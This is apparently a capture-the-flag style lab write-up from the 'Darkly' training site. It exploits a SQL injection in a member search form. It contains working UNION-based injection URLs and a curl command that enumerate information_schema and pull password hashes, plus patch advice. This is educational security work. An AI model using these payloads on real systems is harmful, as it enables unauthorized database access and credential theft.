# SQL Injection

## Exploit

On the /?page=member page, an incorrect input validation of the “Search member by ID” form transforms it into an attack vector for sql injections.

By making the following request :

`curl -s "http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20Commentaire,countersign%20FROM%20Member_Sql_Injection.users&Submit=Submit#" | grep Decrypt | sed 's/.*\(Decrypt.*\)/\1/'`

We obtain the following result: 

`Decrypt this password -> then lower all the char. Sh256 on it and it's good !<br>Surname : 5ff9d0165b4f92b14994e5c685cdce28</pre><table width=50%>`

[md5.gromweb.com](https://md5.gromweb.com/) 5ff9d0165b4f92b14994e5c685cdce28 => FortyTwo

`echo -n "FortyTwo"  | tr '[:upper:]' '[:lower:]' | openssl dgst -sha256 | awk '{print $2}'`

### Requests used during database enumeration:

http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20TABLE_SCHEMA,COLUMN_NAME%20FROM%20information_schema.columns&Submit=Submit#

http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20TABLE_NAME,COLUMN_NAME%20FROM%20information_schema.columns&Submit=Submit#

http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20Commentaire,countersign%20FROM%20Member_Sql_Injection.users&Submit=Submit#

## Patch

- Avoid use of dynamic queries with string concatenation
- Prevent malicious SQL input from being included in executed queries
- Input validation and sanitize all inputs (not only web forms)
- Turn off the visibility of database errors

## Resources

[OWASP SQL INJECTION](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html)
